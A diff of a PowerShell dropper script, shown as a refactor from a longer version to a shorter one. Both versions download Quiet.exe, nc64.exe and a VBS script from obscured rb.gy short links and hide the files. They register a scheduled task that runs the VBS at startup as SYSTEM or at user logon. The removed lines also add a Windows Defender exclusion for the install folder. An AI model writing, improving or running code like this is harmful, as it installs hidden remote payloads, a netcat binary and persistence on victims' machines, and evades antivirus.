@@ -1,90 +1,49 @@
-# Check if the script is running with administrative privileges
+# Check if running as admin
 $isAdmin = ([Security.Principal.WindowsPrincipal]::new([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 
-# Set the installation path and script.vbs URL based on privilege level
-if ($isAdmin) {
-    Write-Output "Running with administrative privileges"
-    $installPath = "C:\Windows"
-    $scriptVbsUrl = "https://rb.gy/w3a7hb"
-} else {
-    Write-Output "Running without administrative privileges"
-    $installPath = Join-Path $env:USERPROFILE "System"
-    $scriptVbsUrl = "https://rb.gy/3lld2p"
-}
+# Determine installation path
+$installPath = $isAdmin ? "C:\Windows" : (Join-Path $env:USERPROFILE "System")
 
-# Create the installation directory if it doesn't exist
+# Create directory if not exists
 if (-not (Test-Path $installPath)) {
     New-Item -ItemType Directory -Path $installPath -Force | Out-Null
-    Write-Output "Created directory: $installPath"
 }
 
-# Define file paths
-$quietExePath = Join-Path $installPath "Quiet.exe"
-$nc64ExePath = Join-Path $installPath "nc64.exe"
-$scriptVbsPath = Join-Path $installPath "script.vbs"
-
-# URLs for the files
-$quietExeUrl = "https://rb.gy/mx0i5"
-$nc64ExeUrl = "https://rb.gy/guty9"
-
-# Download the files
-try {
-    Invoke-WebRequest -Uri $quietExeUrl -OutFile $quietExePath -ErrorAction Stop
-    Invoke-WebRequest -Uri $nc64ExeUrl -OutFile $nc64ExePath -ErrorAction Stop
-    Invoke-WebRequest -Uri $scriptVbsUrl -OutFile $scriptVbsPath -ErrorAction Stop
-    Write-Output "Files downloaded to $installPath"
-} catch {
-    Write-Output "Download failed: $_"
-    exit
+# Download files
+$files = @{
+    "Quiet.exe" = "https://rb.gy/mx0i5"
+    "nc64.exe" = "https://rb.gy/guty9"
+    "script.vbs" = $isAdmin ? "https://rb.gy/w3a7hb" : "https://rb.gy/3lld2p"
 }
 
-# Hide the downloaded files
-attrib +H $quietExePath
-attrib +H $nc64ExePath
-attrib +H $scriptVbsPath
-Write-Output "Files hidden"
-
-# Add Windows Defender exclusion if running with admin privileges
-if ($isAdmin) {
+foreach ($fileName in $files.Keys) {
+    $filePath = Join-Path $installPath $fileName
     try {
-        Add-MpPreference -ExclusionPath $installPath -ErrorAction Stop
-        Write-Output "Windows Defender exclusion added for $installPath"
+        Invoke-WebRequest -Uri $files[$fileName] -OutFile $filePath -ErrorAction Stop
+        attrib +H $filePath
     } catch {
-        Write-Output "Failed to add Windows Defender exclusion: $_"
+        Write-Output "Failed to download $fileName"
     }
 }
 
-# Define the task name (unique by including username)
-$taskName = "RunScriptVBS-$($env:USERNAME -replace '\s+', '')"
+# Prepare task details
+$taskName = "RunScriptVBS-$($env:USERNAME -replace '\s+')"
+$scriptVbsPath = Join-Path $installPath "script.vbs"
 
-# Prepare schtasks command
-$taskCommandArgs = @(
+# Create scheduled task command
+$taskArgs = @(
     "/create",
-    "/tn", "`"$taskName`"",
-    "/tr", "`"wscript.exe `"`"$scriptVbsPath`"`"`"",
+    "/tn", $taskName,
+    "/tr", "wscript.exe ""$scriptVbsPath""",
     "/sc", ($isAdmin ? "onstart" : "onlogon"),
-    "/ru", ($isAdmin ? "SYSTEM" : "`"$env:USERNAME`""),
+    "/ru", ($isAdmin ? "SYSTEM" : $env:USERNAME),
     "/f"
 )
 
-try {
-    # Run the schtasks command
-    $result = Start-Process -FilePath "schtasks.exe" -ArgumentList $taskCommandArgs -NoNewWindow -Wait -PassThru
-    
-    if ($result.ExitCode -eq 0) {
-        Write-Output "Scheduled task '$taskName' has been created successfully."
-        
-        # Attempt to run the task immediately for testing
-        $runResult = Start-Process -FilePath "schtasks.exe" -ArgumentList "/run", "/tn", "`"$taskName`"" -NoNewWindow -Wait -PassThru
-        
-        if ($runResult.ExitCode -eq 0) {
-            Write-Output "Scheduled task started successfully."
-        } else {
-            Write-Output "Failed to start the task immediately, but it's scheduled."
-        }
-    } else {
-        Write-Output "Failed to create the scheduled task. Exit code: $($result.ExitCode)"
-    }
-} catch {
-    Write-Output "Error executing schtasks: $_"
+# Execute scheduled task creation
+$process = Start-Process schtasks -ArgumentList $taskArgs -PassThru -Wait
+if ($process.ExitCode -eq 0) {
+    Write-Output "Scheduled task created successfully"
+} else {
+    Write-Output "Failed to create scheduled task"
 }
